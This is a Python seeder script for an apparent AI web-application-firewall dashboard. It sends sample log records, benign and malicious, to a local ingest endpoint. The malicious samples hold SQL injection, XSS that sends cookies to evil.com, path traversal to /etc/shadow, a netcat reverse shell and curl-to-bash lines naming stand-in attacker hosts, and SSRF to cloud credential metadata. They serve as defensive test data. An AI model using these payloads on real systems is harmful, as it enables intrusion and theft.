#!/usr/bin/env python3
"""
AI-WAF Sample Data Seeder
Sends 60 pre-crafted requests (benign + attacks) to populate the dashboard.
Run with: python scripts/seed_data.py

Requires: pip install httpx
Backend must be running on localhost:8000
"""
import asyncio
import httpx

API = "http://localhost:8000/api/logs/ingest"

SAMPLES = [
    # ── Benign traffic ────────────────────────────────────────────────────────
    {"ip_address": "91.123.44.200", "method": "GET",  "url": "https://shop.example.com/products?category=shoes&page=1", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0", "status_code": 200, "response_size": 18420, "request_body": ""},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/", "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1.15", "status_code": 200, "response_size": 5200, "request_body": ""},
    {"ip_address": "203.45.67.89",  "method": "POST", "url": "https://shop.example.com/auth/login", "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Mobile/15E148", "status_code": 200, "response_size": 800, "request_body": "email=user@example.com&password=hunter2"},
    {"ip_address": "45.67.89.10",   "method": "GET",  "url": "https://shop.example.com/product/42?color=blue&size=M", "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Firefox/127.0", "status_code": 200, "response_size": 12000, "request_body": ""},
    {"ip_address": "112.34.56.78",  "method": "GET",  "url": "https://shop.example.com/static/main.js", "user_agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0", "status_code": 200, "response_size": 94000, "request_body": ""},
    {"ip_address": "89.23.45.67",   "method": "GET",  "url": "https://shop.example.com/blog/top-10-shoes", "user_agent": "Mozilla/5.0 (Macintosh) Safari/605.1", "status_code": 200, "response_size": 22000, "request_body": ""},
    {"ip_address": "134.56.78.90",  "method": "POST", "url": "https://shop.example.com/api/cart/add", "user_agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0", "status_code": 200, "response_size": 340, "request_body": '{"product_id": 42, "qty": 2}'},
    {"ip_address": "91.123.44.200", "method": "GET",  "url": "https://shop.example.com/search?q=running+shoes", "user_agent": "Mozilla/5.0 (Android 14) Chrome/124.0", "status_code": 200, "response_size": 9800, "request_body": ""},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/robots.txt", "user_agent": "Googlebot/2.1 (+http://www.google.com/bot.html)", "status_code": 200, "response_size": 120, "request_body": ""},
    {"ip_address": "203.45.67.89",  "method": "GET",  "url": "https://shop.example.com/sitemap.xml", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 4400, "request_body": ""},
    {"ip_address": "45.67.89.10",   "method": "GET",  "url": "https://shop.example.com/favicon.ico", "user_agent": "Mozilla/5.0 (Macintosh) Safari/605.1", "status_code": 200, "response_size": 1200, "request_body": ""},
    {"ip_address": "112.34.56.78",  "method": "PUT",  "url": "https://shop.example.com/api/users/profile", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 520, "request_body": '{"name": "Jane Doe", "email": "jane@example.com"}'},
    {"ip_address": "89.23.45.67",   "method": "GET",  "url": "https://shop.example.com/api/orders?page=1&limit=10", "user_agent": "PostmanRuntime/7.39.0", "status_code": 200, "response_size": 3200, "request_body": ""},
    {"ip_address": "134.56.78.90",  "method": "GET",  "url": "https://shop.example.com/contact", "user_agent": "Mozilla/5.0 (Linux; Android 13) Chrome/124.0", "status_code": 200, "response_size": 7800, "request_body": ""},
    {"ip_address": "91.123.44.200", "method": "GET",  "url": "https://shop.example.com/about", "user_agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0", "status_code": 200, "response_size": 8100, "request_body": ""},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/api/v1/products?sort=price&order=asc", "user_agent": "Mozilla/5.0 (Macintosh) Firefox/127.0", "status_code": 200, "response_size": 14200, "request_body": ""},
    {"ip_address": "203.45.67.89",  "method": "DELETE","url": "https://shop.example.com/api/cart/item/7", "user_agent": "Mozilla/5.0 (iPhone) Mobile Safari", "status_code": 204, "response_size": 0, "request_body": ""},
    {"ip_address": "45.67.89.10",   "method": "GET",  "url": "https://shop.example.com/checkout", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 16000, "request_body": ""},
    {"ip_address": "112.34.56.78",  "method": "GET",  "url": "https://shop.example.com/dashboard", "user_agent": "Mozilla/5.0 (Macintosh) Chrome/124.0", "status_code": 200, "response_size": 11400, "request_body": ""},
    {"ip_address": "89.23.45.67",   "method": "GET",  "url": "https://shop.example.com/settings/profile", "user_agent": "Mozilla/5.0 (Windows) Firefox/127.0", "status_code": 200, "response_size": 9200, "request_body": ""},

    # ── SQL Injection attacks ─────────────────────────────────────────────────
    {"ip_address": "45.33.32.156",  "method": "GET",  "url": "https://shop.example.com/api/users?id=1' OR '1'='1", "user_agent": "sqlmap/1.8.2#stable (https://sqlmap.org)", "status_code": 500, "response_size": 200, "request_body": ""},
    {"ip_address": "45.33.32.156",  "method": "GET",  "url": "https://shop.example.com/search?q=shoes' UNION SELECT username,password FROM users--", "user_agent": "sqlmap/1.8.2#stable", "status_code": 500, "response_size": 0, "request_body": ""},
    {"ip_address": "198.20.69.74",  "method": "POST", "url": "https://shop.example.com/auth/login", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 120, "request_body": "username=admin'--&password=anything"},
    {"ip_address": "198.20.69.74",  "method": "GET",  "url": "https://shop.example.com/api/products?id=1; DROP TABLE products--", "user_agent": "curl/8.2.1", "status_code": 500, "response_size": 0, "request_body": ""},
    {"ip_address": "45.33.32.156",  "method": "GET",  "url": "https://shop.example.com/api/orders?filter=1 WAITFOR DELAY '0:0:5'--", "user_agent": "sqlmap/1.8.2#stable", "status_code": 500, "response_size": 0, "request_body": ""},

    # ── XSS attacks ───────────────────────────────────────────────────────────
    {"ip_address": "208.85.46.21",  "method": "GET",  "url": "https://shop.example.com/search?q=<script>alert(document.cookie)</script>", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 4400, "request_body": ""},
    {"ip_address": "208.85.46.21",  "method": "POST", "url": "https://shop.example.com/api/comments", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 403, "response_size": 90, "request_body": 'content=<img src=x onerror=alert(1)>&post_id=5'},
    {"ip_address": "193.187.72.201","method": "GET",  "url": "https://shop.example.com/profile?name=<svg onload=fetch('https://evil.com?c='+document.cookie)>", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "193.187.72.201","method": "POST", "url": "https://shop.example.com/api/review", "user_agent": "curl/8.2.1", "status_code": 403, "response_size": 90, "request_body": "text=javascript:alert('XSS')&rating=5"},
    {"ip_address": "208.85.46.21",  "method": "GET",  "url": "https://shop.example.com/redirect?url=javascript:document.location='https://evil.com'", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 403, "response_size": 90, "request_body": ""},

    # ── Path Traversal attacks ────────────────────────────────────────────────
    {"ip_address": "185.220.101.47","method": "GET",  "url": "https://shop.example.com/api/files?name=../../../../etc/passwd", "user_agent": "Nikto/2.1.6", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "185.220.101.47","method": "GET",  "url": "https://shop.example.com/download?path=..%2F..%2F..%2Fetc%2Fshadow", "user_agent": "Nikto/2.1.6", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "185.220.101.47","method": "GET",  "url": "https://shop.example.com/api/read?file=../../windows/system32/win.ini", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "45.33.32.156",  "method": "GET",  "url": "https://shop.example.com/view?doc=%252e%252e%252f%252e%252e%252fetc%252fhosts", "user_agent": "curl/8.2.1", "status_code": 403, "response_size": 0, "request_body": ""},

    # ── Command Injection attacks ─────────────────────────────────────────────
    {"ip_address": "198.20.69.74",  "method": "GET",  "url": "https://shop.example.com/api/ping?host=127.0.0.1; cat /etc/passwd", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "193.187.72.201","method": "POST", "url": "https://shop.example.com/api/process", "user_agent": "curl/8.2.1", "status_code": 403, "response_size": 90, "request_body": "name=nginx || nc -e /bin/sh attacker.com 4444"},
    {"ip_address": "198.20.69.74",  "method": "GET",  "url": "https://shop.example.com/run?arg=$(curl http://evil.com/shell.sh | bash)", "user_agent": "", "status_code": 403, "response_size": 0, "request_body": ""},
    {"ip_address": "45.33.32.156",  "method": "POST", "url": "https://shop.example.com/api/exec", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": "cmd=id && whoami && uname -a"},

    # ── SSRF attacks ──────────────────────────────────────────────────────────
    {"ip_address": "208.85.46.21",  "method": "GET",  "url": "https://shop.example.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "185.220.101.47","method": "GET",  "url": "https://shop.example.com/api/proxy?target=http://localhost:5432/", "user_agent": "curl/8.2.1", "status_code": 403, "response_size": 90, "request_body": ""},
    {"ip_address": "193.187.72.201","method": "POST", "url": "https://shop.example.com/webhook", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 90, "request_body": "callback=file:///etc/passwd"},
    {"ip_address": "208.85.46.21",  "method": "GET",  "url": "https://shop.example.com/import?source=http://192.168.1.1/admin/config", "user_agent": "python-requests/2.31.0", "status_code": 403, "response_size": 0, "request_body": ""},

    # ── More benign to balance the ratio ─────────────────────────────────────
    {"ip_address": "91.123.44.200", "method": "GET",  "url": "https://shop.example.com/api/v1/categories", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 2400, "request_body": ""},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/product/99", "user_agent": "Mozilla/5.0 (Macintosh) Safari/605.1", "status_code": 200, "response_size": 13800, "request_body": ""},
    {"ip_address": "203.45.67.89",  "method": "POST", "url": "https://shop.example.com/api/newsletter", "user_agent": "Mozilla/5.0 (iPhone) Mobile", "status_code": 200, "response_size": 180, "request_body": "email=subscribe@example.com"},
    {"ip_address": "45.67.89.10",   "method": "GET",  "url": "https://shop.example.com/blog/running-tips", "user_agent": "Mozilla/5.0 (Android) Chrome/124.0", "status_code": 200, "response_size": 19400, "request_body": ""},
    {"ip_address": "112.34.56.78",  "method": "GET",  "url": "https://shop.example.com/api/v1/users/me", "user_agent": "PostmanRuntime/7.39.0", "status_code": 200, "response_size": 640, "request_body": ""},
    {"ip_address": "89.23.45.67",   "method": "GET",  "url": "https://shop.example.com/search?q=basketball&sort=rating", "user_agent": "Mozilla/5.0 (Windows) Firefox/127.0", "status_code": 200, "response_size": 10200, "request_body": ""},
    {"ip_address": "134.56.78.90",  "method": "GET",  "url": "https://shop.example.com/api/reviews?product_id=42&limit=5", "user_agent": "Mozilla/5.0 (Macintosh) Chrome/124.0", "status_code": 200, "response_size": 3800, "request_body": ""},
    {"ip_address": "91.123.44.200", "method": "POST", "url": "https://shop.example.com/api/orders", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 201, "response_size": 920, "request_body": '{"items":[{"id":42,"qty":1}],"shipping":"express"}'},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/api/v1/shipping/estimate?zip=75001", "user_agent": "Mozilla/5.0 (Macintosh) Safari/605.1", "status_code": 200, "response_size": 480, "request_body": ""},
    {"ip_address": "203.45.67.89",  "method": "GET",  "url": "https://shop.example.com/privacy-policy", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 14800, "request_body": ""},
    {"ip_address": "45.67.89.10",   "method": "GET",  "url": "https://shop.example.com/terms-of-service", "user_agent": "Mozilla/5.0 (iPhone) Safari", "status_code": 200, "response_size": 18200, "request_body": ""},
    {"ip_address": "112.34.56.78",  "method": "GET",  "url": "https://shop.example.com/api/v1/products/42/related", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 6600, "request_body": ""},
    {"ip_address": "89.23.45.67",   "method": "GET",  "url": "https://shop.example.com/account/orders/history", "user_agent": "Mozilla/5.0 (Macintosh) Firefox/127.0", "status_code": 200, "response_size": 8800, "request_body": ""},
    {"ip_address": "134.56.78.90",  "method": "GET",  "url": "https://shop.example.com/static/style.css", "user_agent": "Mozilla/5.0 (Windows) Chrome/124.0", "status_code": 200, "response_size": 44000, "request_body": ""},
    {"ip_address": "91.123.44.200", "method": "GET",  "url": "https://shop.example.com/api/flash-sale?active=true", "user_agent": "Mozilla/5.0 (Android) Chrome/124.0", "status_code": 200, "response_size": 2200, "request_body": ""},
    {"ip_address": "178.23.45.12",  "method": "GET",  "url": "https://shop.example.com/product/7?ref=newsletter", "user_agent": "Mozilla/5.0 (iPhone) Safari", "status_code": 200, "response_size": 15200, "request_body": ""},
]


async def seed():
    print(f"\n🌱 AI-WAF Data Seeder")
    print(f"   Sending {len(SAMPLES)} sample requests to {API}\n")

    ok = err = 0

    async with httpx.AsyncClient(timeout=15) as client:
        for i, payload in enumerate(SAMPLES, 1):
            try:
                resp = await client.post(API, json=payload)
                resp.raise_for_status()
                d = resp.json()
                score = d.get("threat_score", 0)
                level = d.get("threat_level", "?")
                malicious = "🔴" if d.get("is_malicious") else "🟢"
                types = ", ".join(d.get("attack_types", [])) or "benign"
                print(f"  [{i:02d}/{len(SAMPLES)}] {malicious} score={score:.3f} level={level:6} | {payload['ip_address']} | {types}")
                ok += 1
            except httpx.ConnectError:
                print(f"\n❌ Cannot connect to {API}")
                print("   Make sure the backend is running:")
                print("   → Docker:  docker compose up -d")
                print("   → Local:   uvicorn main:app --port 8000 (from backend/)")
                return
            except Exception as e:
                print(f"  [{i:02d}] ❌ {type(e).__name__}: {e}")
                err += 1

    print(f"\n✅ Done! {ok} inserted, {err} failed")
    print(f"   → Open http://localhost:3000 to see the dashboard")


if __name__ == "__main__":
    asyncio.run(seed())
